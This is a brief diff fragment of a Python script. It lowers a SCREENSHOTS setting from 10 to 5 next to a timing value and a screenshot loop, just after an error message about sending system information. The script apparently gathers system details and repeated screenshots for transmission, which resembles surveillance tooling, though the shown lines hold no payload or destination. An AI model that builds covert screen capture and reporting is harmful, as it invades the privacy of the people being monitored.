@@ -75,7 +75,7 @@ else:
     print(f"Error sending system information: {response.status_code}")
 
 # Edit these variables as you want
-SCREENSHOTS = 10
+SCREENSHOTS = 5
 TIMING = 5
 
 for i in range(SCREENSHOTS):
